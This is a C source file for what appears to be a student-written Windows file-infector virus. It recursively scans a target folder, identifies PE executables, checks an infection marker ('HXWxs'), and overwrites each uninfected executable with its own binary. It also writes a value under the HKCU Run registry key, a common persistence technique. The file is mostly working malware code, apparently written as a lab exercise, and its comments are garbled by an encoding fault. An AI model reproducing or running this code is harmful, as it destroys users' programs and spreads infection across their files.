/*This is a flag:start*/
#include<stdio.h>
#include<io.h>
#include<Windows.h>
#include<stdlib.h>
#include<string.h>
#include <direct.h>
//#include<dir.h>

//#define Targetfile "*.*"
int is_exe(FILE* fd);
void InfectFile(void);
void copyfile(char* infile, char* outfile);
int is_injected(FILE* fd);
int find_source();
int infect_folder(char folder_name[1000]);
int set_key();
/*ȫ�ֱ���*/
char dir[100]; //�����洢����������·��������Ⱦʹ�� 

void copyfile(char* infile, char* outfile)
{
	//FILE* in, * out;
	//printf("%s\n%s\n",infile,outfile);
	//fopen_s(&in,infile, "rb");
	//fopen_s(&out,outfile, "wb");
	/*while (!feof(in))
	//{
		fputc(fgetc(in), out);
	}*/
	//fclose(in);
	//fclose(out);
	WCHAR In[256];
	WCHAR Out[256];
	memset(In, 0, sizeof(In));
	memset(Out, 0, sizeof(Out));
	MultiByteToWideChar(CP_ACP, 0, infile, strlen(infile) + 1,In,sizeof(In) / sizeof(In[0]));
	MultiByteToWideChar(CP_ACP, 0, outfile, strlen(outfile) + 1, Out, sizeof(Out) / sizeof(Out[0]));
	CopyFile(In, Out, FALSE);
	printf("%s is infected!\n", outfile);
}


/*This is a flag:end*/
int main(void)
{
	/*ʵ�����Ҷ�λ�Ĺ��ܣ������ļ��洢��*/
	char first_dir[100];
	strcpy_s(first_dir, "D:\\virus_test");
	//_getcwd(dir, 100);
	//�����ļ��еı�����Ѱ�Ҳ�����ԴȪ 
	//strcat_s(dir, "\\");
	/*if (find_source() == 1) {
		printf("������������·��Ϊ��%s\n\n\n", dir);
	}
	else return 0;*/
	//printf("%s\n", dir);
	strcpy_s(dir, "C:\\Users\\ܽ��\\Desktop\\�����ȫ����\\TestCode\\virus1\\Debug\\Project1.exe");
	if (set_key() == 1);//printf("set key successfully!\n");
	//_getcwd(first_dir, 100);
	infect_folder(first_dir);
	//printf("This is HXWxs!");
	system("pause");
	return 0;
}

int find_source() {
	/*ʵ�����Ҷ�λ�Ĺ��ܣ�����������·���洢����dir��*/
	struct _finddata_t ffblk;
	char documenttype[10] = "*.*";
	int done = _findfirst(documenttype, &ffblk);
	if (strcmp(ffblk.name, "..") != 0 && strcmp(ffblk.name, ".") != 0 && strstr(ffblk.name, ".") != NULL) {
		FILE* fp;
		fopen_s(&fp,ffblk.name, "rb");
		int h = is_exe(fp);
		int x = is_injected(fp);
		printf("%s %d %d \n\n", ffblk.name, h, x);
		if (h && (!x)) {
			strcat_s(dir, ffblk.name);
			return 1;
		}
	}
	while (!_findnext(done, &ffblk)) {
		if (strcmp(ffblk.name, "..") != 0 && strcmp(ffblk.name, ".") != 0 && strstr(ffblk.name, ".") != NULL) {
			FILE* fp;
			fopen_s(&fp,ffblk.name, "rb");
			int h = is_exe(fp);
			int x = is_injected(fp);
			printf("%s %d %d \n\n", ffblk.name, h, x);
			if (h && (!x)) {
				strcat_s(dir, ffblk.name);
				return 1;
			}
		}
	}
	return 0;
}

int is_exe(FILE* fd) {//�ж��Ƿ��ǿ�ִ���ļ�
	char dos_mark[3];
	long address_of_nt_header;
	long offset = 0x3c;
	char nt_mark[3];
	if (fd == NULL)
		return 0;
	fgets(dos_mark, 3, fd);
	if (strcmp(dos_mark, "MZ"))
		return 0;
	fseek(fd, offset, SEEK_SET);
	fread(&address_of_nt_header, 4, 1, fd);
	fseek(fd, address_of_nt_header, SEEK_SET);
	fgets(nt_mark, 3, fd);
	if (strcmp(nt_mark, "PE"))
		return 0;
	return 1;
}

int is_injected(FILE* fd) {//�ж��Ƿ񱻸�Ⱦ	
	long offset = 0x7d98;
	char mark[6];
	int nt_offset = 0;
	int mark_offset = 0;

	fseek(fd, offset, SEEK_SET);
	fread(mark, 5, 1, fd);
	mark[5] = '\0';
	if (strcmp(mark, "HXWxs") == 0) {
		//printf("match!\n");
		return 0;
	}
	//printf("not match!\n");
	return 1;
}
//����һ����Ӧ�ı������������ã�������ȱ���
//infect_fileӦ����һ���ݹ麯������ʽ����������еݹ��أ�
//���ļ���Ϊ��λ���еݹ飬���ݵ����ļ��е�ǰ������� 
int infect_folder(char folder_name[1000]) {
	char target[1000];//��Ϊ���˵����� 
	char subfolder[1000];
	char file[1000];
	strcpy_s(target, folder_name);
	strcat_s(target, "\\*.*");
	//printf("��ǰ�ļ���Ϊ��%s-----------------\n", folder_name);
	int done;
	/*������ǰ��һ���ļ��У�������Ӧ������*/
	struct _finddata_t ffblk;
	char* documenttype = target;
	done = _findfirst(documenttype, &ffblk);
	if (done == -1) {
		return 0;
	}
	if (strcmp(ffblk.name, "..") != 0 && strcmp(ffblk.name, ".") != 0) {
		FILE* fp;
		if (strstr(ffblk.name, ".") == NULL) {
			strcpy_s(subfolder, folder_name);
			strcat_s(subfolder, "\\");
			strcat_s(subfolder, ffblk.name);
			//printf("%s dir\n", subfolder);
			infect_folder(subfolder);//��һ����Ⱦ���ļ����е��ļ� 
		}
		else {
			strcpy_s(file, folder_name);
			strcat_s(file, "\\");
			strcat_s(file, ffblk.name);
			if (strcmp(ffblk.name, "MFCApplication2.exe") != 0 && strcmp(ffblk.name, "MFCApplocation2.ilk") != 0 && strcmp(ffblk.name, "MFCApplocation2.pdb") != 0) {
				fopen_s(&fp,file, "rb");
				int h = is_exe(fp);
				int x = is_injected(fp);
				//printf("%s %d %d \n", file, h, x);
				if (h && x) {
					copyfile(dir, file);
					//printf("it has been infected!\n");
				}
			}
		}
	}
	while (!_findnext(done, &ffblk))
	{
		if (strcmp(ffblk.name, "..") != 0 && strcmp(ffblk.name, ".") != 0) {
			FILE* fp;
			if (strstr(ffblk.name, ".") == NULL) {
				strcpy_s(subfolder, folder_name);
				strcat_s(subfolder, "\\");
				strcat_s(subfolder, ffblk.name);
				//printf("%s dir\n", subfolder);
				infect_folder(subfolder);//��һ����Ⱦ���ļ����е��ļ� 
			}
			else {
				strcpy_s(file, folder_name);
				strcat_s(file, "\\");
				strcat_s(file, ffblk.name);
				if (strcmp(ffblk.name, "MFCApplication2.exe") != 0 && strcmp(ffblk.name, "MFCApplocation2.ilk") != 0 && strcmp(ffblk.name, "MFCApplocation2.pdb") != 0) {
					fopen_s(&fp,file, "rb");
					int h = is_exe(fp);
					int x = is_injected(fp);
					//printf("%s %d %d \n", file, h, x);
					if (h && x) {
						copyfile(dir, file);
						//printf("it has been infected!\n");
					}
				}
			}
		}
	}
	_findclose(done);
	return 0;
}


int set_key()
{
	//�ҵ�ϵͳ�������� 	
	//char *szSubKey= "Software\\Microsoft\\Windows\\CurrentVersion\\Run";	
	HKEY hKey;
	//��ע��������� 	
	//HKEY hKey;
	size_t ret = RegCreateKeyEx(HKEY_CURRENT_USER, (LPWSTR)L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE,
		KEY_ALL_ACCESS, NULL, &hKey, NULL);
	TCHAR Data[254];
	memset(Data, 0, sizeof(Data));
	wcsncpy_s(Data, TEXT("success\0"), 254);
	size_t iLen = wcslen(Data);
	ret = RegSetValueEx(hKey, L"test5", 0, REG_SZ, (CONST BYTE*)Data, sizeof(TCHAR) * iLen);
	if (ret == ERROR_SUCCESS)
	{
		//printf("set value successfully!\n");
	}
	return 1;
}